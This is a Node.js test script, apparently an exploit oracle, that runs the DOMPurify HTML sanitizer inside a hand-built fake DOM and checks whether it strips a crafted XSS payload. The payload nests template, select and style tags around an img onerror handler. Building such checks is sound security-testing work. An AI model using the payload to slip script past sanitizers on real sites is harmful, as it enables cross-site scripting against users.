'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function buildDocument() {
  class EventTarget { addEventListener(){} removeEventListener(){} dispatchEvent(){ return true; } }
  class Node extends EventTarget {
    constructor(nodeType, nodeName) {
      super();
      this.nodeType = nodeType;
      this.nodeName = nodeName;
      this.childNodes = [];
      this.parentNode = null;
    }
    get firstChild() { return this.childNodes[0] || null; }
    get lastChild() { return this.childNodes[this.childNodes.length - 1] || null; }
    get nextSibling() {
      if (!this.parentNode) return null;
      const idx = this.parentNode.childNodes.indexOf(this);
      return this.parentNode.childNodes[idx + 1] || null;
    }
    appendChild(child) {
      child.parentNode = this;
      this.childNodes.push(child);
      return child;
    }
    removeChild(child) {
      const idx = this.childNodes.indexOf(child);
      if (idx !== -1) this.childNodes.splice(idx, 1);
      child.parentNode = null;
      return child;
    }
    insertBefore(newNode, refNode) {
      if (!refNode) return this.appendChild(newNode);
      const idx = this.childNodes.indexOf(refNode);
      newNode.parentNode = this;
      this.childNodes.splice(idx, 0, newNode);
      return newNode;
    }
    cloneNode() { return this; }
    get textContent() { return this.childNodes.map(c => c.textContent || '').join(''); }
    set textContent(v) {
      this.childNodes = [];
      if (v) this.appendChild(new Text(v));
    }
  }
  class Text extends Node {
    constructor(data) { super(3, '#text'); this.data = data || ''; }
    get textContent() { return this.data; }
    set textContent(v) { this.data = v; }
  }
  class Element extends Node {
    constructor(tagName) {
      super(1, tagName.toUpperCase());
      this.tagName = tagName.toUpperCase();
      this.attributes = [];
      this._attrMap = {};
    }
    setAttribute(name, value) {
      name = String(name);
      if (!(name in this._attrMap)) {
        this.attributes.push({ name, value: String(value) });
      } else {
        this.attributes.find(a => a.name === name).value = String(value);
      }
      this._attrMap[name] = String(value);
    }
    getAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this._attrMap, name) ? this._attrMap[name] : null;
    }
    hasAttribute(name) { return Object.prototype.hasOwnProperty.call(this._attrMap, name); }
    removeAttribute(name) {
      delete this._attrMap[name];
      this.attributes = this.attributes.filter(a => a.name !== name);
    }
    get outerHTML() {
      const attrs = this.attributes.map(a => ' ' + a.name + '="' + a.value + '"').join('');
      return '<' + this.tagName.toLowerCase() + attrs + '>' + this.innerHTML + '</' + this.tagName.toLowerCase() + '>';
    }
    get innerHTML() {
      return this.childNodes.map(c => {
        if (c.nodeType === 1) return c.outerHTML;
        if (c.nodeType === 3) return c.data;
        return '';
      }).join('');
    }
    set innerHTML(html) {
      this.childNodes = [];
      parseInto(this, String(html));
    }
  }
  class DocumentFragment extends Node {
    constructor() { super(11, '#document-fragment'); }
    get innerHTML() {
      return this.childNodes.map(c => {
        if (c.nodeType === 1) return c.outerHTML;
        if (c.nodeType === 3) return c.data;
        return '';
      }).join('');
    }
  }
  function parseInto(root, html) {
    const stack = [root];
    const tagRe = /<\/?([a-zA-Z0-9]+)([^>]*)>/g;
    let lastIndex = 0;
    let m;
    function pushText(text) {
      if (text.length) stack[stack.length - 1].appendChild(new Text(text));
    }
    function parseAttrs(attrStr) {
      const attrs = [];
      const re = /([a-zA-Z0-9_-]+)\s*=\s*"([^"]*)"/g;
      let am;
      while ((am = re.exec(attrStr))) attrs.push([am[1], am[2]]);
      return attrs;
    }
    while ((m = tagRe.exec(html))) {
      const whole = m[0];
      const tagName = m[1];
      const isClose = whole[1] === '/';
      const attrStr = m[2] || '';
      pushText(html.slice(lastIndex, m.index));
      lastIndex = tagRe.lastIndex;
      if (isClose) {
        for (let j = stack.length - 1; j > 0; j--) {
          if (stack[j].tagName && stack[j].tagName.toLowerCase() === tagName.toLowerCase()) {
            stack.length = j;
            break;
          }
        }
      } else {
        const el = new Element(tagName);
        parseAttrs(attrStr).forEach(([n, v]) => el.setAttribute(n, v));
        stack[stack.length - 1].appendChild(el);
        const selfClosing = /^(img|br|hr|input|meta|link)$/i.test(tagName);
        if (!selfClosing) stack.push(el);
      }
    }
    pushText(html.slice(lastIndex));
  }
  class Document extends Node {
    constructor() {
      super(9, '#document');
      this.documentElement = new Element('html');
      this.appendChild(this.documentElement);
      this.body = new Element('body');
      this.documentElement.appendChild(this.body);
      const self = this;
      this.implementation = {
        createHTMLDocument: function () { return buildFreshDocument(); },
        createDocument: function () { return buildFreshDocument(); },
        hasFeature: function () { return true; }
      };
    }
    createElement(tag) { return new Element(tag); }
    createElementNS(ns, tag) { return new Element(tag); }
    createTextNode(data) { return new Text(data); }
    createDocumentFragment() { return new DocumentFragment(); }
    getElementsByTagName() { return []; }
    get documentMode() { return undefined; }
  }
  function buildFreshDocument() {
    return new Document();
  }
  const document = buildFreshDocument();
  const window = {
    document,
    Node,
    Element,
    Text,
    DocumentFragment,
    NodeFilter: { SHOW_ELEMENT: 1, FILTER_ACCEPT: 1, FILTER_REJECT: 2, FILTER_SKIP: 3 },
    HTMLTemplateElement: Element,
    location: { href: 'about:blank' },
    DOMParser: undefined
  };
  window.self = window;
  window.window = window;
  return window;
}

function main() {
  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to require dompurify: ' + String(e && e.message) });
    return;
  }

  let win;
  try {
    win = buildDocument();
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to build minimal DOM shim: ' + String(e && e.message) });
    return;
  }

  let DOMPurify;
  try {
    DOMPurify = createDOMPurify(win);
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to initialize DOMPurify with shim window: ' + String(e && e.message) });
    return;
  }

  const marker = 'dp_' + Date.now() + '_' + Math.random().toString(36).slice(2);

  let benignOutput;
  try {
    benignOutput = DOMPurify.sanitize('<b>hello world ' + marker + '</b>');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call threw: ' + String(e && e.message) });
    return;
  }

  if (typeof benignOutput !== 'string' || benignOutput.indexOf(marker) === -1 || benignOutput.toLowerCase().indexOf('<b>') === -1) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call did not return expected sanitized content: ' + String(benignOutput) });
    return;
  }

  const operationCompleted = true;

  const payload =
    '<template><template></template><select><style></template><img src=x onerror="' +
    marker +
    '_alert(1)\"></style></select></template>';

  let maliciousOutput;
  let exploitSucceeded = false;
  let evidence;
  try {
    maliciousOutput = DOMPurify.sanitize(payload);
    const lower = String(maliciousOutput).toLowerCase();
    const hasHandler = lower.indexOf('onerror=') !== -1 || lower.indexOf('onload=') !== -1;
    const hasMarkerInHandler = lower.indexOf((marker + '_alert').toLowerCase()) !== -1;
    if (hasHandler && hasMarkerInHandler) {
      exploitSucceeded = true;
      evidence = 'sanitize() output retained an active-content event handler with payload marker: ' + maliciousOutput;
    } else {
      exploitSucceeded = false;
      evidence = 'sanitize() output did not retain active-content handler; output: ' + maliciousOutput;
    }
  } catch (e) {
    exploitSucceeded = false;
    evidence = 'Malicious sanitize call threw (treated as blocked): ' + String(e && e.message);
  }

  finish({ operation_completed: operationCompleted, exploit_succeeded: exploitSucceeded, evidence: evidence });
}

try {
  main();
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Unhandled exception: ' + String(e && e.message) });
}
